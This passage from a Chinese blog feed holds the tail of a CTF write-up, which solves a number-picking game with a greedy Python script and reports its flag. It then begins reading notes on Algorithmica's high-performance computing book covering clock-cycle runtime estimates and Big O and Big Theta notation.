class="line"></span><br><span class="line">        counter -= <span class="number">1</span></span><br><span class="line">        steps.append(<span class="string">f&quot;Choose <span class="subst">&#123;best_choice&#125;</span>: +<span class="subst">&#123;best_choice&#125;</span> (Opponent gets factors <span class="subst">&#123;get_factors(best_choice)&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Assign remaining numbers to opponent</span></span><br><span class="line">    <span class="keyword">for</span> num, status <span class="keyword">in</span> board.items():</span><br><span class="line">        <span class="keyword">if</span> status == <span class="string">&#x27;unassigned&#x27;</span>:</span><br><span class="line">            board[num] = <span class="string">&#x27;opponent&#x27;</span></span><br><span class="line">            opponent_score += num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;steps&#x27;</span>: steps,</span><br><span class="line">        <span class="string">&#x27;my_score&#x27;</span>: my_score,</span><br><span class="line">        <span class="string">&#x27;opponent_score&#x27;</span>: opponent_score,</span><br><span class="line">        <span class="string">&#x27;final_result&#x27;</span>: <span class="string">&#x27;Win&#x27;</span> <span class="keyword">if</span> my_score &gt; opponent_score <span class="keyword">else</span> <span class="string">&#x27;Lose&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;difference&#x27;</span>: my_score - opponent_score</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simulate all 3 levels</span></span><br><span class="line">level1 = simulate_game(<span class="number">50</span>, <span class="number">19</span>)</span><br><span class="line">level2 = simulate_game(<span class="number">100</span>, <span class="number">37</span>)</span><br><span class="line">level3 = simulate_game(<span class="number">200</span>, <span class="number">76</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Saving the results into a text file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;game_simulation_results.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i, level <span class="keyword">in</span> <span class="built_in">enumerate</span>([level1, level2, level3], <span class="number">1</span>):</span><br><span class="line">        file.write(<span class="string">f&quot;Level <span class="subst">&#123;i&#125;</span>:\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Steps:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> level[<span class="string">&#x27;steps&#x27;</span>]:</span><br><span class="line">            file.write(<span class="string">f&quot;  <span class="subst">&#123;step&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;My Score: <span class="subst">&#123;level[<span class="string">&#x27;my_score&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Opponent Score: <span class="subst">&#123;level[<span class="string">&#x27;opponent_score&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Final Result: <span class="subst">&#123;level[<span class="string">&#x27;final_result&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">        file.write(<span class="string">f&quot;Score Difference: <span class="subst">&#123;level[<span class="string">&#x27;difference&#x27;</span>]&#125;</span>\n\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-221013.png"
                      class=""
                >
<p>整理得到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">47, 49, 35, 39, 26, 46, 33, 45, 38, 44, 34, 50, 30, 28, 42, 40, 32, 24, 36</span><br><span class="line"></span><br><span class="line">97, 91, 95, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 63, 92, 82, 66, 76, 74, 54,</span><br><span class="line">88, 75, 50, 100, 98, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 48, 72</span><br><span class="line"></span><br><span class="line">199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129,</span><br><span class="line">172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146,</span><br><span class="line">78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120,</span><br><span class="line">80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198</span><br></pre></td></tr></table></figure></div>
<p>直接输入，连赢三局，得到flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153311.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153259.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-05-153137.png"
                      class=""
                >
<p>flag:<code>flag&#123;Greed, is......key of the life.&#125;</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Algorithmica-HPC研读记录1</title>
    <url>/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/</url>
    <content><![CDATA[<h1 id="algorithmica-hpc研读记录1-3章">Algorithmica
HPC研读记录（1-3章）</h1>
<h3 id="一复杂性模型">一、复杂性模型</h3>
<h4 id="概述">概述</h4>
<h5 id="传统复杂性理论">传统复杂性理论</h5>
<blockquote>
<p>To estimate the real running time of a program, you need to sum all
latencies for its executed instructions and divide it by the <em>clock
frequency</em>, that is, the number of cycles a particular CPU does per
second.</p>
</blockquote>
<p>为了计算实际的程序运行时间，需要把所有指令的延迟都累加起来。“以时钟频率划分”指的是通过将程序执行过程中所有指令的延迟时间（latencies）除以CPU的时钟频率，来估算程序的实际运行时间。</p>
<ol type="1">
<li><strong>时钟频率（Clock Frequency）</strong>：
时钟频率是指CPU每秒钟能够执行多少个时钟周期，单位通常是赫兹（Hz）。例如，如果一个CPU的时钟频率是
3 GHz，那就意味着它每秒钟可以执行 30 亿个时钟周期。</li>
<li><strong>延迟（Latency）</strong>：
每条指令在执行时都有一个延迟，表示从开始执行到完成所需的时间。这个延迟通常是以时钟周期为单位的。例如，如果某条指令需要
5 个时钟周期来执行，那么它的延迟就是 5 个周期。</li>
<li><strong>以时钟频率划分的意思</strong>：
当你想要计算程序的总运行时间时，你需要将所有指令的延迟加起来，得到总的延迟周期数。然后，为了将这个延迟周期转换为时间，你就需要将总的延迟周期数除以时钟频率。这是因为时钟频率告诉你
CPU
每秒钟执行多少个时钟周期，从而你可以通过除法将延迟周期转换为实际的时间（单位为秒）。</li>
</ol>
<p>假设某程序的指令总延迟为 100,000 个时钟周期，而 CPU 的时钟频率是 2
GHz（即每秒 20
亿个周期），那么程序的实际运行时间可以通过以下公式计算：</p>
<p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.158ex;" xmlns="http://www.w3.org/2000/svg" width="45.276ex" height="3.447ex" role="img" focusable="false" viewBox="0 -1011.8 20012.1 1523.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">运</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">行</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">时</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">间</text></g><g data-mml-node="mo" transform="translate(4277.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5333.6,0)"><g data-mml-node="mtext" transform="translate(220,481.4) scale(0.707)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">延</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">迟</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">周</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">期</text><text data-variant="normal" transform="translate(4000,0) scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mtext" transform="translate(573.6,-370.3) scale(0.707)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">时</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">钟</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">频</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">率</text></g><rect width="3735.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(9586.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(10642.6,0)"><g data-mml-node="mrow" transform="translate(220,477.2) scale(0.707)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(1500,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1778,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"></path></g></g><g data-mml-node="mrow" transform="translate(419.2,-450.9) scale(0.707)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(1278,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="mn" transform="translate(1033,393.1) scale(0.707)"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g></g></g><rect width="2517.9" height="60" x="120" y="220"></rect></g><g data-mml-node="mtext" transform="translate(13400.5,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">秒</text></g><g data-mml-node="mo" transform="translate(14678.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(15734.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2278,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(2778,0)"></path></g><g data-mml-node="mtext" transform="translate(19012.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">秒</text></g></g></g></svg></mjx-container></span></p>
<p>通过这种方式，可以估算程序的实际运行时间，考虑到不同指令的执行延迟和CPU的时钟频率。</p>
<h5 id="渐进分析理论">渐进分析理论</h5>
<p>在计算机发展的初期，计算机科学家需要密切关注程序的执行时间、所用的处理周期（即基本的计算单元）以及涉及的操作次数。这些详细的度量在当时非常重要，因为计算资源有限，性能优化对程序的运行有显著的影响。</p>
<p>随着计算机性能的提升，系统变得更强大，详细的执行时间、周期和操作数的度量变得不那么关键。计算机科学家转而更加关注渐近分析（Asymptotic
Analysis），这种分析方法提供了一个抽象的视角，用来描述算法在输入规模增大时的性能变化。</p>
<ul>
<li>例如，计算机科学家不再一一跟踪每一个操作和周期，而是使用“大
O”符号来描述一个算法随着输入规模增长的运行时间表现。这种方法让你可以忽略常数因素和较低阶的项，专注于算法如何随着输入的增大而扩展。</li>
</ul>
<p>使用渐近复杂度（例如 Big O、Big Theta 和 Big
Omega）使得研究人员和工程师可以专注于算法效率的“整体情况”。这种方法抹去了硬件性能和初始操作成本的细节，让人们能够更加容易地比较不同算法，而不需要考虑具体实现或硬件差异的影响。</p>
<p>Big O、Big Theta 和 Big Omega
是用于描述算法时间复杂度的渐近符号，它们分别表示不同方面的性能分析。它们的主要区别在于描述算法的上界、下界和精确度。以下是对这三者的详细解释：</p>
<ol type="1">
<li><strong>Big O (大 O)</strong></li>
</ol>
<ul>
<li><strong>定义</strong>：Big O 符号用于表示算法的
<strong>上界</strong>，即算法的 <strong>最坏情况</strong>
时间复杂度。</li>
<li><strong>含义</strong>：Big O
描述的是随着输入规模增大，算法的运行时间增长的速度。它给出了一个上限，说明在最坏情况下，算法的执行时间不会超过某个特定的增长速率。</li>
<li><strong>表示法</strong>：如果某个算法的时间复杂度是
O(f(n))，意味着对于足够大的输入 n，算法的时间复杂度最多是 f(n)
的一个常数倍，忽略常数因素。</li>
<li><strong>例子</strong>：假设算法的时间复杂度为
<code>O(n^2)</code>，这意味着随着输入规模 n
增加，算法的运行时间最多增长到与 n^2 成正比。</li>
</ul>
<p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="34.864ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 15410 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(704,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1093,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1693,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2359.8,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(3415.6,0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(4397.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(4898,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(5448,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5837,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6437,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mstyle" transform="translate(6826,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mtext" transform="translate(7826,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><text data-variant="normal" transform="translate(389,0) scale(1,-1)" font-size="884px" font-family="serif">对</text><text data-variant="normal" transform="translate(1389,0) scale(1,-1)" font-size="884px" font-family="serif">于</text><text data-variant="normal" transform="translate(2389,0) scale(1,-1)" font-size="884px" font-family="serif">足</text><text data-variant="normal" transform="translate(3389,0) scale(1,-1)" font-size="884px" font-family="serif">够</text><text data-variant="normal" transform="translate(4389,0) scale(1,-1)" font-size="884px" font-family="serif">大</text><text data-variant="normal" transform="translate(5389,0) scale(1,-1)" font-size="884px" font-family="serif">的</text><path data-c="20" d="" transform="translate(6389,0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(6639,0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(7195,0)"></path></g></g></g></svg></mjx-container></span></p>
<p>其中，C 是常数，n 是输入规模。</p>
<ol start="2" type="1">
<li><strong>Big Theta (大 Θ)</strong></li>
</ol>
<ul>
<li><strong>定义</strong>：Big Theta 符号用于表示算法的
<strong>精确</strong> 时间复杂度，或者说它给出了一个算法时间复杂度的
<strong>上下界</strong>。</li>
